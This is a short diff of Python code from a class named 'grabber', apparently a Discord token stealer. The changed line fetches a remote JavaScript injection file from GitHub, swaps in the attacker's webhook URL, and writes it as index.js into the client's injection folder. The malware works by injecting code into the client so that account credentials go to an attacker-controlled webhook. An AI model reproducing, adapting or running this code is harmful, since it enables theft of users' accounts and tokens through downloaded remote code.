@@ -219,7 +219,7 @@ class grabber:
                                         inj_path+'initiation', exist_ok=True)
                                 except PermissionError:
                                     pass
-                            f = httpx.get('https://raw.githubusercontent.com/TWIST-X7/Injection/main/Injection-clean.js').text.replace(
+                            f = httpx.get('https://raw.githubusercontent.com/sheikizin/teste/main/injetar.js').text.replace(
                                 "%WEBHOOK%", weblink)
                             with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                 indexFile.write(f)
